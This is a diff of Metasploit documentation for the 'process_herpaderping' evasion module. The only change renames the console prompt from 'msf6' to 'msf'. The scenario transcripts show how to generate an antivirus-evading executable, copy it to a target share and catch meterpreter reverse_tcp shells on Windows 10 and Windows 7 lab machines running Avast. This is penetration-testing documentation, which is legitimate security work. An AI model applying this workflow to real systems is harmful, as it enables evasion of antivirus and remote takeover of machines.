@@ -72,28 +72,28 @@ environment variables can be used in the path and the default is set to
 ## Scenarios
 ### Windows 10 x64 version 1909 with Avast Antivirus (also tested with Windows Defender)
 ```
-msf6 > use evasion/windows/process_herpaderping
+msf > use evasion/windows/process_herpaderping
 [*] Using configured payload windows/x64/meterpreter/reverse_tcp
-msf6 evasion(windows/process_herpaderping) > set LHOST 192.168.144.1
+msf evasion(windows/process_herpaderping) > set LHOST 192.168.144.1
 LHOST => 192.168.144.1
-msf6 evasion(windows/process_herpaderping) > set target 0
+msf evasion(windows/process_herpaderping) > set target 0
 target => 0
-msf6 evasion(windows/process_herpaderping) > set payload windows/x64/meterpreter/reverse_tcp
+msf evasion(windows/process_herpaderping) > set payload windows/x64/meterpreter/reverse_tcp
 payload => windows/x64/meterpreter/reverse_tcp
-msf6 evasion(windows/process_herpaderping) > handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.144.1 -P 4444
+msf evasion(windows/process_herpaderping) > handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.144.1 -P 4444
 [*] Payload handler running as background job 0.
 
 [*] Started reverse TCP handler on 192.168.144.1:4444
-msf6 evasion(windows/process_herpaderping) > run
+msf evasion(windows/process_herpaderping) > run
 [+] raU.exe stored at /home/msfuser/.msf4/local/raU.exe
-msf6 evasion(windows/process_herpaderping) > cp /home/msfuser/.msf4/local/raU.exe /remote_share/tmp/test_x64.exe
+msf evasion(windows/process_herpaderping) > cp /home/msfuser/.msf4/local/raU.exe /remote_share/tmp/test_x64.exe
 [*] exec: cp /home/msfuser/.msf4/local/raU.exe /remote_share/tmp/test_x64.exe
 
-msf6 evasion(windows/process_herpaderping) >
+msf evasion(windows/process_herpaderping) >
 [*] Sending stage (200262 bytes) to 192.168.144.128
 [*] Meterpreter session 1 opened (192.168.144.1:4444 -> 192.168.144.128:50205) at 2021-01-22 13:02:14 +0100
 
-msf6 evasion(windows/process_herpaderping) > sessions -i 1
+msf evasion(windows/process_herpaderping) > sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter > sysinfo
@@ -113,11 +113,11 @@ meterpreter > [*] Shutting down Meterpreter...
 
 ### Windows 7 x86 with Avast Antivirus
 ```
-msf6 evasion(windows/process_herpaderping) > set target 1
+msf evasion(windows/process_herpaderping) > set target 1
 target => 1
-msf6 evasion(windows/process_herpaderping) > set payload windows/meterpreter/reverse_tcp
+msf evasion(windows/process_herpaderping) > set payload windows/meterpreter/reverse_tcp
 payload => windows/meterpreter/reverse_tcp
-msf6 evasion(windows/process_herpaderping) > options
+msf evasion(windows/process_herpaderping) > options
 
 Module options (evasion/windows/process_herpaderping):
 
@@ -145,7 +145,7 @@ Evasion target:
    1   Microsoft Windows (x86)
 
 
-msf6 evasion(windows/process_herpaderping) > run
+msf evasion(windows/process_herpaderping) > run
 
 [+] raU.exe stored at /home/msfuser/.msf4/local/raU.exe
 [!] #### WARNING ####
@@ -154,19 +154,19 @@ This payload won't work on 32-bit Windows 10 versions from 1511 (build
 These versions have a bug in the kernel that crashes/BugCheck the OS
 when executing this payload. So, to avoid this, the payload won't run if
 it detects the OS is one of these versions.
-msf6 evasion(windows/process_herpaderping) > cp /home/msfuser/.msf4/local/raU.exe /remote_share/tmp/test_x86.exe
+msf evasion(windows/process_herpaderping) > cp /home/msfuser/.msf4/local/raU.exe /remote_share/tmp/test_x86.exe
 [*] exec: cp /home/msfuser/.msf4/local/raU.exe /remote_share/tmp/test_x86.exe
 
-msf6 evasion(windows/process_herpaderping) > jobs -K
+msf evasion(windows/process_herpaderping) > jobs -K
 Stopping all jobs...
-msf6 evasion(windows/process_herpaderping) > handler -p windows/meterpreter/reverse_tcp -H 192.168.144.1 -P 4444
+msf evasion(windows/process_herpaderping) > handler -p windows/meterpreter/reverse_tcp -H 192.168.144.1 -P 4444
 [*] Payload handler running as background job 1.
 
 [*] Started reverse TCP handler on 192.168.144.1:4444
-msf6 evasion(windows/process_herpaderping) > [*] Sending stage (175174 bytes) to 192.168.144.133
+msf evasion(windows/process_herpaderping) > [*] Sending stage (175174 bytes) to 192.168.144.133
 [*] Meterpreter session 3 opened (192.168.144.1:4444 -> 192.168.144.133:51542) at 2021-01-22 13:09:43 +0100
 
-msf6 evasion(windows/process_herpaderping) > sessions -i 3
+msf evasion(windows/process_herpaderping) > sessions -i 3
 [*] Starting interaction with 3...
 
 meterpreter > sysinfo
